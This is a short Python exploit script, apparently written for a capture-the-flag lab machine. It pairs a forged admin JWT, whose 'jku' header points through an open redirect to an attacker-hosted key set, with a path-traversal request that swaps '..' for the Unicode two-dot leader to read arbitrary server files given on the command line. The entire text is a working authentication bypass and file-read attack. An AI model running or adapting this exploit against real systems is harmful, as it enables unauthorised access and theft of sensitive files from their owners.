import requests
import sys


jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTQuMjIvc3RhdGljL2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.rw4gMmz5r4M82vCi3YSg1SJUTyPBitNU-FMMYSUtYskCvcYEtYpSwib40s4dpaMBuOyq82a0CnQExIb7assbrpvk_-1sBM5G7430qWeKFyXBnjePWRoD-Q9CKTaL2AUfiOqarUrTM3-j5CcoBEBOeNJEV6APtDIRjwCBgsn7-kYpVgRjXaUyAiF6duHayY8kW00CfSzvFkoOFJWHWoPRljCMGLBEMXE1T8MfhLUhBKs7l2Z-jpcBVXaFvstgTo2VGxjAgcHnZX7VP-zzhN-5qRGGESF_VEeegcFf-ptWKAq8uy67E3XOWmi-aojD3VrACKdqCkfKGsLlO_VbHORhLA"

file_name = sys.argv[1]
url = "http://10.10.11.126/display/?page=../../../../../../../../" + file_name
unicode_back = "\u2025"
url = url.replace('..', unicode_back)
cookie = "auth=" + jwt

response = requests.get(url, cookies={'auth': jwt})
print(response.text)
